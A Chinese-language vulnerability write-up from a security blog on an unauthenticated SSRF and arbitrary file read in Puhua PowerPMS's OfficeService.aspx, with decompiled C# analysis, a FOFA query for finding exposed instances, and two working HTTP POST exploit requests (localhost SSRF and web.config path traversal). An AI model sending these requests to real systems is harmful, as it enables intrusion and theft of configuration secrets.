---
title: "普华Powerpms OfficeService.aspx SSRF+文件读取漏洞"
source: https://mrxn.net/jswz/powerpms-FormXml-DocFile-OfficeService-SSRF.html
asset_dir: assets/普华powerpms-officeservice.aspx-ssrf+文件读取漏洞
---

# 普华Powerpms OfficeService.aspx SSRF+文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/30 08:20
* 930浏览
* [0评论](#comment)
* 42分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统OfficeService.aspx存在[SSRF](https://mrxn.net/tag/SSRF)（服务器端请求伪造）漏洞，未经身份验证的攻击者可能利用该漏洞访问系统资源或敏感信息，导致数据泄露或系统安全性降低，同时该接口还存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可利用该漏洞读取系统文件，造成敏感信息泄漏。

漏洞预警服务

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

看下OfficeService.aspx的实现逻辑

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="OfficeService.aspx.cs" Inherits="Power.PMS.PowerPlat.FormXml.DocFile.OfficeService" %>
```

根据代码引用在Power.PMS.dll中找到PowerPlat.FormXml.DocFile.OfficeService的实现

网络安全

```
protected void Page_Load(object sender, EventArgs e)
{
  PowerGlobal.CheckSecurity(this.Request);
  iMsgServer2000 iMsgServer2000 = new iMsgServer2000();
  string str1 = this.Request["HumanId"];
  string sessionId = this.Request["sessionid"];
  string str2 = "2009";
  if (!string.IsNullOrEmpty(sessionId))
    str2 = PowerGlobal.GetConfigRunTimeValue("FtpConfig", "iWebOfficeVersion", PowerGlobal.getSession(sessionId));
  if (string.op_Equality(str2, "2009"))
  {
    MethodInfo methodInfo = Enumerable.FirstOrDefault<MethodInfo>((IEnumerable<MethodInfo>) iMsgServer2000.GetType().GetMethods(), (Func<MethodInfo, bool>) (m => string.op_Equality(((MemberInfo) m).Name, "Load")));
    if (MethodInfo.op_Inequality(methodInfo, (MethodInfo) null))
      ((MethodBase) methodInfo).Invoke((object) iMsgServer2000, new object[1]
      {
        (object) this.Request
      });
  }
  else
    iMsgServer2000.MsgVariant(this.Request.BinaryRead(this.Request.ContentLength));
  string msgByName1 = iMsgServer2000.GetMsgByName("RECORDID");
  string str3 = this.Request["action"];
  if (!string.IsNullOrEmpty(str3) && string.op_Equality(str3, "download"))
  {
    string weburl = this.Request["WEBURL"];
    string filename = "";
    if (!string.IsNullOrEmpty(weburl))
    {
      this.mFileBody = this.LoadFileStream(weburl, out filename);
    }
    else
    {
      if (string.IsNullOrEmpty(weburl))
        msgByName1 = this.Request.QueryString["mRecordID"];
      if (string.IsNullOrEmpty(weburl))
        msgByName1 = this.Request.QueryString["Id"];
      this.mFileBody = this.LoadFile(msgByName1, out filename);
    }
```

根据**action**参数的值进入不同的分支处理逻辑

安全研究工具

当**action=download**时，将**WEBURL**带入会进入**LoadFileStream**方法

```
public byte[] LoadFileStream(string weburl, out string filename)
{
  filename = DateTime.Now.ToString("yyyy-MM-dd");
  byte[] numArray = (byte[]) null;
  if (weburl.ToLower().IndexOf("app_data/") > -1)
  {
    if (weburl.ToLower().StartsWith("app_data/"))
      weburl = "~/" + weburl;
    if (weburl.ToLower().StartsWith("/app_data/"))
      weburl = "~" + weburl;
    string str = this.Server.MapPath(weburl);
    filename = Path.GetFileName(str);
    try
    {
      numArray = File.ReadAllBytes(str);
    }
    catch (Exception ex)
    {
      numArray = (byte[]) null;
    }
  }
  else
  {
    string str1 = "ASP.NET_SessionId";
    string str2 = $"{str1}={HttpContext.Current.Request.Cookies[str1].Value}";
    string str3 = this.Request.Url.Host;
    if (!this.Request.Url.IsDefaultPort)
      str3 = $"{this.Request.Url.Host}:{this.Request.Url.Port.ToString()}";
    string str4 = "http://" + str3;
    if (!weburl.ToLower().StartsWith("http://"))
      weburl = str4 + weburl;
    using (WebClient webClient = new WebClient())
    {
      ((NameValueCollection) webClient.Headers).Add("Cookie", str2);
      ((NameValueCollection) webClient.Headers)["User-Agent"] = HttpContext.Current.Request.UserAgent;
      try
      {
        numArray = webClient.DownloadData(weburl);
      }
      catch (Exception ex)
      {
        numArray = (byte[]) null;
      }
    }
  }
  return numArray;
}
```

对**weburl**进行系列处理，**如添加协议头或者以/app\_data/开头的直接进行[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)**。

# 漏洞复现

## SSRF

```
POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
Host: powerpms.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=download&WEBURL=http://127.1
```

[![普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](images/img-001-157b2f82068f.webp)](https://image.mrxn.net/3c3c50ff431b489db894284351128bf2.webp)

成功获取到本地80端口的web服务，根据title的特征，在网络空间测绘平台可知其为火绒终端部署系统

漏洞预警服务

[![普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](images/img-002-5ce0057b2020.webp)](https://image.mrxn.net/f2ae223ac2e44ac3b61aaba981d22bb3.webp)

## 文件读取

```
POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
Host: powerpms.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=download&WEBURL=app_data/../web.config
```

[![普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](images/img-003-4ce14eda89d0.webp)](https://image.mrxn.net/f2164e39d5d84726b96cb756f18b2989.webp)

成功读取到 web.config 文件内容

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
* [#asp.net](https://mrxn.net/tag/asp.net)
* [#SSRF](https://mrxn.net/tag/SSRF)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.SSRF](#toc-5-1-)
* [5.2.文件读取](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](https://mrxn.net/jswz/powerpms-FormXml-DocFile-OfficeService-SSRF.html)  
文章链接：<https://mrxn.net/jswz/powerpms-FormXml-DocFile-OfficeService-SSRF.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-FormXml-DocFile-OfficeService-SSRF.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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